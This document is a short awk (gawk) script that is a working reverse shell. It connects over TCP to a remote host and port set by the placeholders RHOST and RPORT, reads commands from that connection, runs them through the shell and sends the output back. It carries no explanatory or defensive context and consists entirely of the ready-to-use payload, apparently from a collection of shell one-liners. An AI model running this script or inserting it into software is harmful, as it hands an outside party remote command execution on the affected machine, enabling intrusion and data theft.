BEGIN {
  s = "/inet/tcp/0/" RHOST "/" RPORT
  while (1) {
    printf "> " |& s
    if ((s |& getline c) <= 0) break
	while (c && (c |& getline) > 0) print $0 |& s
	close(c)
  }
}
